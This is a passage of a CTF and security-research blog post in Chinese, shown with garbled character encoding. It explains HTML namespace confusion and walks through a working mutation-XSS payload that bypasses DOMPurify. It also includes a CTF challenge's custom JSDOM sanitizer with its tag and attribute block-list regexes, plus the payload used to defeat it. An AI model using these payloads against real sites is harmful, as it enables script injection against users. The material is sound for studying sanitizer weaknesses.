ã€‚ç„¶è€Œåœ¨æ‰€è°“çš„å¤–éƒ¨å†…å®¹ä¸­æƒ…å†µå°±å˜äº†ï¼šå¤–éƒ¨å†…å®¹ä¸­<code>&lt;style&gt;</code>å¯ä»¥å…·æœ‰å­å…ƒç´ ï¼Œå¹¶ä¸”å®ä½“ç¼–ç ä¼šè¢«è§£ç ã€‚</p><p>ä»ä¸€ä¸ªä¾‹å­çœ‹å‘½åæ··æ·†ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    å‘½åæ··æ·†ä¹‹å­å…ƒç´ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹çœ‹è¢«æ¸²æŸ“æˆäº†ä»€ä¹ˆæ ·ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701677604463.png" alt="1701677604463" width="5%" height="5%" /><p>ç¬¬ä¸€ä¸ª<code>style</code>é‡Œçš„<code>a</code>æ ‡ç­¾æœç„¶è¢«å½“æˆäº†æ–‡æœ¬ï¼Œä½†ç”±äºç¬¬äºŒä¸ª<code>style</code>åœ¨<code>svg</code>ä¸­ï¼Œåˆ‡æ¢äº†å‘½åç©ºé—´ã€‚å› æ­¤è¿™æ—¶å€™<code>a</code>æ ‡ç­¾ä¼šè¢«æ¸²æŸ“å‡ºæ¥ã€‚</p><p><code>That&#39;s pretty cool,man.</code></p><p>åˆ°è¿™é‡Œä½œè€…æ³¼äº†å†·æ°´ï¼š</p><blockquote><p>å¦‚æœæˆ‘ä»¬åœ¨ <code>&lt;svg&gt;</code> æˆ– <code>&lt;math&gt;</code> å†…éƒ¨ï¼Œé‚£ä¹ˆç†è®ºä¸Šæ¥è¯´æ‰€æœ‰å…ƒç´ ä¹Ÿéƒ½åœ¨é <code>HTML</code> å‘½åç©ºé—´ä¸­ã€‚ç„¶è€Œäº‹å®å¹¶ä¸æ˜¯å¦‚æ­¤ï¼Œ<code>HTML</code> è§„èŒƒä¸­æœ‰ä¸€äº›å…ƒç´ ç§°ä¸º<code>MathML</code> æ–‡æœ¬é›†æˆç‚¹å’Œ <code>HTML</code> é›†æˆç‚¹ã€‚ è¿™äº›å…ƒç´ çš„å­å…ƒç´ å…·æœ‰ <code>HTML</code> å‘½åç©ºé—´ã€‚</p></blockquote><p>å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    Integration Point<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>math</code>æ ‡ç­¾çš„å„¿å­<code>style</code>å…ƒç´ ä½äº<code>MathML</code>å‘½åç©ºé—´ä¸­ï¼Œè€Œ <code>mtext</code> ä¸­çš„<code>style</code>å…ƒç´ ä½äº <code>HTML</code>å‘½åç©ºé—´ä¸­ã€‚ è¿™æ˜¯å› ä¸º<code>mtext</code>æ˜¯ <code>MathML</code> æ–‡æœ¬é›†æˆç‚¹ï¼Œå¹¶ä½¿è§£æå™¨åˆ‡æ¢å‘½åç©ºé—´ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701678240650.png" alt="1701678240650" width="5%" height="5%" /><p><a href="https://dev.w3.org/html5/spec-LC/tree-construction.html">é›†æˆç‚¹å‚è€ƒè¿™ä¸ª</a>ï¼š</p><p><strong>MathML:</strong></p><ol><li>mi</li><li>mo</li><li>mn</li><li>ms</li><li>mtext</li></ol><p><strong>HTML:</strong></p><ol><li>annotation-xml:å¦‚æœå…¶åŒ…å«<code>encoding</code>å±æ€§ï¼Œå¹¶ä¸”å±æ€§å€¼ç­‰äº<code>text/html</code>æˆ–è€…<code>application/xhtml+xml</code></li><li>svg foreignObject</li><li>svg desc</li><li>svg title</li></ol><p>ç„¶è€Œï¼Œå¹¶ä¸æ˜¯é›†æˆç‚¹æ‰€æœ‰çš„å­èŠ‚ç‚¹éƒ½å…·æœ‰<code>HTML</code>å‘½åç©ºé—´ã€‚æœ‰ä¸¤ä¸ªä¾‹å¤–ï¼š<code>mglyph</code> å’Œ <code>malignmark</code>ã€‚ ä»…å½“å®ƒä»¬æ˜¯ <code>MathML</code> æ–‡æœ¬é›†æˆç‚¹çš„ç›´æ¥å­çº§æ—¶ï¼Œæ‰ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚</p><p>ä¸¾ä¸ªä¾‹å­ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    Integration Point2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸º<code>mglyph</code>æ˜¯<code>mtext</code>çš„ç›´æ¥å­å…ƒç´ ï¼Œå› æ­¤ä»–çš„å‘½åç©ºé—´æ˜¯<code>MathML</code>,æ‰€æœ‰ä»–ä¸‹é¢çš„<code>a</code>æ ‡ç­¾æ¸²æŸ“å‡ºæ¥äº†ã€‚è€Œç¬¬äºŒä¸ª<code>mglyph</code>æ˜¯äºŒçº§å­èŠ‚ç‚¹ï¼Œå› æ­¤æ¸²æŸ“ä¸å‡ºæ¥<code>a</code>æ ‡ç­¾ï¼Œå› ä¸ºå‘½åç©ºé—´æ˜¯<code>HTML</code>ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701679627566.png" alt="1701679627566" width="5%" height="5%" /><p>ä½œè€…åˆ°è¿™é‡Œæ•´ç†ä¸€ä¸‹åˆ¤æ–­ä¸åŒå‘½åç©ºé—´çš„æ³•åˆ™ï¼Œæˆ‘åªèƒ½è¯´è¿™å°±æ˜¯é»‘å®¢å§ï¼ˆè†œï¼‰ï¼š</p><ul><li>å½“å‰å…ƒç´ åœ¨å…¶çˆ¶å…ƒç´ çš„å‘½åç©ºé—´ä¸­ï¼Œé™¤éæ»¡è¶³ä»¥ä¸‹å‡ ç‚¹æ¡ä»¶ã€‚</li><li>å¦‚æœå½“å‰å…ƒç´ æ˜¯&lt; svg&gt;æˆ–&lt; math&gt;ï¼Œè€Œçˆ¶å…ƒç´ åœ¨HTMLå‘½åç©ºé—´ï¼Œé‚£ä¹ˆå½“å‰å…ƒç´ åˆ†åˆ«åœ¨SVGæˆ–MathMLå‘½åç©ºé—´ã€‚</li><li>å¦‚æœå½“å‰å…ƒç´ çš„çˆ¶å…ƒç´ æ˜¯HTMLé›†æˆç‚¹ï¼Œåˆ™å½“å‰å…ƒç´ åœ¨HTMLå‘½åç©ºé—´ï¼Œé™¤éæ˜¯&lt; svg&gt;æˆ–&lt; math&gt;ã€‚</li><li>å¦‚æœå½“å‰å…ƒç´ çš„çˆ¶å…ƒç´ æ˜¯MathMLé›†æˆç‚¹ï¼Œé‚£ä¹ˆå½“å‰å…ƒç´ åœ¨HTMLå‘½åç©ºé—´ï¼Œé™¤éå®ƒæ˜¯&lt; svg&gt;ã€&lt; math&gt;ã€&lt; mglyph&gt;æˆ–&lt; malignmark&gt;ã€‚</li><li>å¦‚æœå½“å‰å…ƒç´ æ˜¯&lt; b&gt;ã€&lt; big&gt;ã€&lt; blockquote&gt;ã€&lt; body&gt;ã€&lt; br&gt;ã€&lt; center&gt;ã€&lt; code&gt;ã€&lt; dd&gt;ã€&lt; div&gt;ã€&lt; dl&gt;ã€&lt; dt&gt;ã€&lt; em&gt;ã€&lt; embed&gt;ã€&lt; h1&gt;ä¹‹ä¸€ã€‚&lt; h2&gt;, &lt; h3&gt;, &lt; h4&gt;, &lt; h5&gt;, &lt; h6&gt;, &lt; head&gt;, &lt; hr&gt;, &lt; i&gt;, &lt; img&gt;, &lt; li&gt;, &lt; listing&gt;, &lt; menu&gt;, &lt; meta&gt;, &lt; nobr&gt;, &lt; ol&gt;, &lt; p&gt;, &lt; pre&gt;, &lt; ruby&gt;, &lt; s&gt;, &lt; small&gt;ã€‚&lt; span&gt;ã€&lt; strong&gt;ã€&lt; strike&gt;ã€&lt; sub&gt;ã€&lt; sup&gt;ã€&lt; table&gt;ã€&lt; tt&gt;ã€&lt; u&gt;ã€&lt; ul&gt;ã€&lt; var&gt;æˆ–&lt; font&gt;ï¼Œå¹¶å®šä¹‰äº†é¢œè‰²ã€é¢æˆ–å¤§å°å±æ€§ï¼Œé‚£ä¹ˆï¼Œå †æ ˆä¸Šçš„æ‰€æœ‰å…ƒç´ éƒ½ä¼šè¢«å…³é—­ï¼Œç›´åˆ°çœ‹åˆ°MathMLæ–‡æœ¬æ•´åˆç‚¹ã€HTMLæ•´åˆç‚¹æˆ–HTMLå‘½åç©ºé—´ä¸­çš„å…ƒç´ ã€‚ç„¶åï¼Œå½“å‰å…ƒç´ ä¹Ÿåœ¨HTMLå‘½åç©ºé—´ã€‚</li></ul><h4 id="DOMPurifyç»•è¿‡"><a href="#DOMPurifyç»•è¿‡" class="headerlink" title="DOMPurifyç»•è¿‡"></a>DOMPurifyç»•è¿‡</h4><p>æ¥ç€è®©æˆ‘ä»¬çœ‹ä½œè€…ç»™çš„ç©¶æ<code>payload</code>ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(1)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ª<code>payload</code>èåˆäº†<code>form</code>åµŒå¥—å¯¼è‡´çš„è§£æé—®é¢˜ä»¥åŠå‘½åç©ºé—´æ··æ·†å¯¼è‡´<code>svg</code>ä¸‹é¢çš„<code>style</code>çš„å­å…ƒç´ æ˜¯æ–‡æœ¬ã€‚</p><p>ç¬¬ä¸€æ¬¡è¿™ä¸ªæ–‡æœ¬æ˜¯ä¼šè¢«è§£ææˆè¿™æ ·çš„ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/6415e83558da0d64bdd9cf4211b0ed3.png" alt="6415e83558da0d64bdd9cf4211b0ed3" width="25%" height="25%" /><p>æ¥ä¸‹æ¥ç€é‡è®²ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå˜æˆè¿™æ ·å­ã€‚</p><p>åˆ°ç¬¬ä¸‰å±‚çš„<code>mtext</code>éƒ½æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œåé¢ç¢°åˆ°äº†<code>/form</code>ç»“å°¾å¯¼è‡´æŒ‡é’ˆæ¸…ç©ºï¼Œä¹‹åç¢°åˆ°<code>form</code>è¿™ä¹Ÿå°±å¯¼è‡´å¯ä»¥<code>form</code>åµŒå¥—äº†ã€‚ç„¶ååé¢åˆæ”¾äº†ä¸ª<code>mglyph</code>ï¼Œè¿™æ˜¯æœ€ä»–å¦ˆç‰›é€¼çš„ç‚¹ã€‚å› ä¸º<code>mtext</code>æ˜¯é›†æˆç‚¹ï¼Œè€Œä¸‹é¢çš„å„¿å­æ˜¯<code>form</code>ï¼Œæ‰€ä»¥ä¹‹åçš„éƒ½æ˜¯<code>html</code>å‘½åç©ºé—´ï¼ŒåŒ…æ‹¬<code>mglyph</code>ï¼Œé‚£ä¹ˆåé¢çš„<code>style</code>è‡ªç„¶ä¹Ÿä¸ç”¨è¯´äº†ä»–å°±æ˜¯ä¸ª<code>text</code>ï¼ï¼ï¼ï¼</p><p>æ—¢ç„¶æ˜¯å­—ç¬¦ä¸²çš„è¯æ˜¯ä¸ä¼šè¢«<code>DOMPurify</code>è§£æçš„ï¼Œä¸Šé¢è¿™ä¸²ä¸œè¥¿æ— æŸçš„é€šè¿‡äº†<code>DOMPurify</code>è¿‡æ»¤å™¨éšååºåˆ—åŒ–è¿”å›ç»™<code>innerHTML</code>ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è€Œè¢«æµè§ˆå™¨äºŒæ¬¡è§£æçš„æ—¶å€™çŒœçŒœä¼šå‘ç”Ÿå•¥ï¼Ÿ</p><p>é¦–å…ˆç¬¬äºŒä¸ª<code>form</code>ä¼šè¢«åƒæ‰ï¼Œå› ä¸ºæ ‡ç­¾æ²¡é—­åˆã€‚ç°åœ¨å˜æˆäº†è¿™æ ·ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç°åœ¨è¿™ä¸ª<code>mglyph</code>æˆä¸º<code>mtext</code>çš„å„¿å­ï¼Œé‚£ä¹ˆå°±å˜æˆäº†<code>MATH</code>å‘½åç©ºé—´ã€‚è€Œ<code>style</code>æ­¤æ—¶ä¹Ÿå˜æˆ<code>MATH</code>å‘½åç©ºé—´ã€‚è€Œè¿™ä¸ª<code>img</code>è‡ªç„¶ä¹Ÿå°±å˜æˆäº†æ ‡ç­¾ã€‚æˆåŠŸ<code>XSS</code>ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/07d380258200443fda1dfc9823684a9.png" alt="07d380258200443fda1dfc9823684a9" width="25%" height="25%" /><h4 id="Walk-Off-The-Earth"><a href="#Walk-Off-The-Earth" class="headerlink" title="Walk Off The Earth"></a>Walk Off The Earth</h4><p>è¿™é¢˜æœ‰ä¸‰ä¸ªè€ƒç‚¹ã€‚</p><p>ç¬¬ä¸€ä¸ªè€ƒç‚¹æ˜¯ç»•è¿‡sha256æ¯”è¾ƒï¼Œéœ€è¦æ»¡è¶³<strong>c5a5c0d64fab871c+???(ä½ è¾“å…¥çš„å­—ç¬¦ä¸²)çš„sha256å¼€å¤´æ˜¯7ä¸ª0</strong>ã€‚</p><p>è¿™ä¸ªå°±æ˜¯åŸé¢˜å•¦ã€‚</p><pre><code>https://github.com/66Leo66/PoW-solver-rs</code></pre><p>ç¬¬äºŒç‚¹å°±æ˜¯å¦‚ä½•<code>xss</code>ï¼Œè¿™ä¸ªå°±æ˜¯ä¸ª<code>mXSS</code>å•¦ã€‚å› ä¸ºç”¨<code>JSDOM</code>è§£æäº†ä¸€æ¬¡ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'No note!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token keyword">const</span> sanitize <span class="token operator">=</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> clean <span class="token operator">=</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>    <span class="token keyword">return</span> clean<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> BLOCKED_TAG <span class="token operator">=</span> <span class="token regex">/(script|iframe|a|img|svg|audio|video)$/i</span>    <span class="token keyword">const</span> BLOCKED_ATTR <span class="token operator">=</span> <span class="token regex">/(href|src|on.+)/i</span>    <span class="token keyword">const</span> document <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSDOM</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>window<span class="token punctuation">.</span>document    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> html    <span class="token keyword">let</span> node<span class="token punctuation">;</span>    <span class="token keyword">const</span> iter <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before sanitization:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">=</span> iter<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_TAG<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>                node<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After eliminating blocked:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>attributes<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">const</span> att <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_ATTR<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked attribute is :-"</span><span class="token operator">+</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span>                    node<span class="token punctuation">.</span><span class="token function">removeAttributeNode</span><span class="token punctuation">(</span>att<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Final payload:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>    <span class="token keyword">return</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥è¿™é‡Œç›´æ¥ç”¨å‰é¢æåˆ°çš„<code>payload</code>å°±å¯ä»¥äº†ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„è¯ä¸èµ°åˆ°<code>catch res</code>å°±ä¼šè¢«è¦†ç›–ï¼Œå¹¶ä¸”å³ä¾¿ä½ èµ°åˆ°<code> puppeteer.ProtocolError</code>è¿™ä¸ªå¼‚å¸¸å—é‡Œå› ä¸ºæœ‰ä¸ª<code>finnaly</code>å—ï¼Œæ‰€ä»¥ä¹Ÿä¼šè¢«è¦†ç›–ã€‚è¿™é‡Œæ˜æ˜¾å°±æ˜¯<code>await page.goto(url, &#123; waitUntil: &#39;domcontentloaded&#39;, timeout: 2000 &#125;);</code>ï¼Œè®©è¿™é‡ŒåŠ 